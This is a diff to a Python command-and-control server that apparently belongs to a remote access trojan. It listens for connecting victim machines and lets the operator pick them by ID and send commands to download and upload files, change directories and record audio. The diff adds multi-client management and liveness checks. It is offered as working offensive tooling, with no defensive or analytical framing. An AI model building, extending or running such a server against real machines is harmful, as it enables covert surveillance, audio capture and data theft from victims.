@@ -8,6 +8,8 @@ import keyboard
 SERVER_HOST = '0.0.0.0'
 SERVER_PORT = 5003
 BUFFER_SIZE = 4096
+clients_dict = dict()
+count = 0
 
 
 def download(client_socket):
@@ -80,16 +82,19 @@ def record_audio(client_socket):
     client_socket.send(time.encode())
 
 
-def thread_line(q):
-    n_threads = 5
-    for t in range(n_threads):
-        worker = Thread(target=socket_accept)
-        # Demon run.
-        worker.daemon = True
-        worker.start()
-    # Waiting until the line is empty.
-    q.join()
-    q.task_done()
+def audit_of_all_connected_clients():
+    del_key = []
+    for key, value in clients_dict.items():
+        client_socket = value[0]
+        try:
+            client_socket.send('ok'.encode())
+            client_socket.recv(1024)
+        except socket.error:
+            del_key.append(key)
+    for key in del_key:
+        del clients_dict[key]
+    for key, value in clients_dict.items():
+        print(key, value[1])
 
 
 def socket_create():
@@ -101,7 +106,7 @@ def socket_create():
         print('Soket creation error: ' + str(msg))
 
 
-def thread_socket_bind():
+def socket_bind():
     # Сreating. I'm listening to the network.
     try:
         global s
@@ -115,27 +120,41 @@ def thread_socket_bind():
         socket_bind()
 
 
-def socket_bind():
-    # Сreating. I'm listening to the network.
-    try:
-        global s
-        print('Bindding socket to port: ' + str(SERVER_PORT))
-        s.bind((SERVER_HOST, SERVER_PORT))
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.listen(5)
-        socket_accept()
-    except socket.error as msg:
-        print('Soket bindding error: ' + str(msg) + '\n' + 'Retrying...')
-        socket_bind()
+def thread_line(q):
+    n_threads = 5
+    for t in range(n_threads):
+        worker = Thread(target=socket_accept)
+        # Demon run.
+        worker.daemon = True
+        worker.start()
+    # Waiting until the line is empty.
+    client_management()
+    q.join()
+    q.task_done()
 
 
 def socket_accept():
     # I'm hooking up everyone who's asking.
+    global count
     client_socket, client_address = s.accept()
-    print('\nConnection has been established | ' + 'IP ' + client_address[0] +
-          ' | Port ' + str(client_address[1]) + ' |')
-    send_commands(client_socket, client_address)
-    client_socket.close()
+    count += 1
+    clients_dict[count] = [client_socket, client_address]
+
+
+def client_management():
+    # Providing access to clients.
+    while True:
+        client_command = str(input('Enter client ID or auxiliary command: '))
+        if client_command.lower() == 'all active':
+            audit_of_all_connected_clients()
+        elif client_command.isdigit():
+            client_command = int(client_command)
+            if client_command in clients_dict:
+                send_commands(clients_dict[client_command][0], clients_dict[client_command][1])
+            else:
+                print('Invalid ID...')
+        else:
+            print('Unknown command...')
 
 
 def send_commands(client_socket, client_address):
@@ -144,10 +163,11 @@ def send_commands(client_socket, client_address):
         command = input('| IP ' + client_address[0] + ' | Port '
                         + str(client_address[1]) + ' | ' + 'Enter the command:')
         client_socket.send(command.encode())
-        if command.lower() == 'exit':
+        if command.lower() == 'leave':
             break
         elif command.lower() == 'download':
-            download(client_socket)
+            # download(client_socket)
+            Thread(target=download(client_socket)).start()
         elif command.lower() == 'upload':
             upload(client_socket)
         elif command.lower() == 'change dir':
@@ -164,15 +184,7 @@ def send_commands(client_socket, client_address):
 def main():
     # Launcher.
     socket_create()
-    print('To start the server in multithreaded mode, enter YES. '
-          '\nTo start in single-threaded mode, enter NO.')
-    st_thread = str(input('YES or NO?: '))
-    if st_thread.lower() == 'yes':
-        thread_socket_bind()
-    elif st_thread.lower() == 'no':
-        socket_bind()
-    else:
-        quit()
+    socket_bind()
 
 
 main()
